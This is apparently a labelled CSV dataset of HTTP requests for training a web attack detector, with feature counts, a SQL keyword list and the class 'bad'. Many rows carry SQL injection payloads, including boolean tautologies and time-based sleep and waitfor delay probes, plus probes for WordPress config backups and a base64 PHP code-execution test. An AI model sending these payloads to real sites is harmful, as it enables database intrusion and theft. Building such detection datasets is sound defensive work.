method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/Mod_Rewrite_Shop/RateProduct-3.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=acUn3t1x&upass2=acUn3t1x&uphone=555-666-0606&urname=wtnckitw&uuname=-1%22%20or%2053-51%20%3d%20%222,0,2,0,0,6,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/cart.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/cart.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infocateg.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/_mmServerScripts/MMHTTPDB.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/themes/postage-sydney,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/userinfo.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct%27%3dsleep%284%29%3d%27-1/,,2,0,0,1,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/redir.php?r=-1%27%20or%20%2788%27%3d%2788,,4,0,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/redir.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%2520Laguna%2520Street%27%20and%20sleep%284%29%3d%27&name=fwfvqiwg&subject=1&submit=Submit,2,0,0,1,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=fwfvqiwg&subject=-1%27%20or%20%2751%27%3d%270&submit=Submit,4,0,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php?p=valid&pp=-1%22%20or%20%2278%22%3d%220,,0,4,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infotitle.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/doLogin,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/themes/profitstheme,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/details.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/showxml.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/artists.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/comment.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/_mmServerScripts/MMHTTPDB.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/details.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/guestbook.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/comment.php?aid=,comment=-1%22%20or%20%2276%22%3d%220&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit,0,4,0,0,5,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infotitle.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/showimage.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/doSubscribe,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/listproducts.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-config%20-%20Copy.php,,0,0,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/userinfo.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/artists.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/default.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/details.php?id=-1%20or%2018-16%20%3d%202,,0,0,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php?p=-1%27%20or%20%2770%27%3d%2770,,4,0,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/secured/newuser.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20/network-attached-storage-dlink/1/,,0,0,1,2,6,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-3/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/cart.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/userinfo.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/color-printer/-1%20or%2086%3d0/,,0,0,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/sendcommand.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/secured/phpinfo.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=-1%20or%2055%3d55&upass2=acUn3t1x&uphone=555-666-0606&urname=wtnckitw&uuname=wtnckitw,0,0,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=-1%20or%2029-27%20%3d%202&name=fwfvqiwg&subject=1&submit=Submit,0,0,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/listproducts.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/guestbook.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-1/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/comment.php?aid=1%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&pid=4,,2,0,1,0,5,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/secured/phpinfo.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infotitle.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/guestbook.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/doSubscribe,btnSubmit=-1%22%20or%20%2287%22%3d%220&txtEmail=sample%40email.tst,0,4,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/guestbook.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-config.php.BAK,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/plugins/islidex,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/comment.php,comment=1&name=%3cyour%20name%20here%3e&phpaction=echo%2520%2524_POST%255bcomment%255d%253b%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&Submit=Submit,0,1,1,2,8,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/listproducts.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/product.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/survey_questions.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/comment.php?pid=7%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20,,3,0,1,0,5,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/vuln.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/survey_questions.jsp?step=b%22%20and%20sleep%284%29%3d%22,,0,2,0,1,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/sendcommand.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-2.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/_mmServerScripts/MMHTTPDB.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/redir.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-1.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/artists.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/guestbook.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/sendFeedback,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/doSubscribe,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/doLogin,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-1/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/vuln.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/themes/ElegantEstate,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=-1%22%20or%2034-32%20%3d%20%222&name=fwfvqiwg&subject=1&submit=Submit,0,2,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/test.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/themes/newspress/functions/js/shortcode-generator/preview-shortcode-external.php?shortcode=%5Btwitter_follow%20username=%22acunetix%22%5D,,0,2,0,0,1,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/comment.php?aid=,comment=1%20and%20sleep%284%29%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit,0,0,0,1,6,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/secured/newuser.php,signup=signup%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=acUn3t1x&upass2=acUn3t1x&uphone=555-666-0606&urname=wtnckitw&uuname=wtnckitw,2,1,1,0,7,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/cart.php,addcart=4&price=1000%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20,3,0,1,0,5,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/default.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-3.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/themes/breakingnewz,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/showxml.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/vuln.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/redir.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/pr/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infotitle.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/default.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/secured/newuser.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/comment.php,comment=1&name=-1%20or%20103-101%20%3d%202&phpaction=echo%20%24_POST%5bcomment%5d%3b&Submit=Submit,0,0,0,0,5,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/secured/phpinfo.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infoartist.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/plugins/ToolsPack/ToolsPack.php?e=cHJpbnQobWQ1KCdhY3VuZXRpeCcpKTsg,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.php?test=1%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20,,1,0,1,2,6,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20/web-camera-a4tech/2/,,3,0,1,0,5,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/userinfo.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/showimage.php?file=.%2fpictures%2f7.jpg%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&size=160,,0,1,1,2,6,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/comment.php?aid=1&pid=4,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/secured/newuser.php,signup=-1%27%20or%20%2793%27%3d%270,4,0,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/secured/newuser.php,signup=signup&uaddress=3137%2520Laguna%2520Street%22%3dsleep%284%29%3d%22&ucc=4111111111111111&uemail=sample%40email.tst&upass=acUn3t1x&upass2=acUn3t1x&uphone=555-666-0606&urname=wtnckitw&uuname=wtnckitw,0,2,0,1,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/_mmServerScripts/MMHTTPDB.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/listproducts.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/listproducts.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/themes/nomadic,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/rate.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
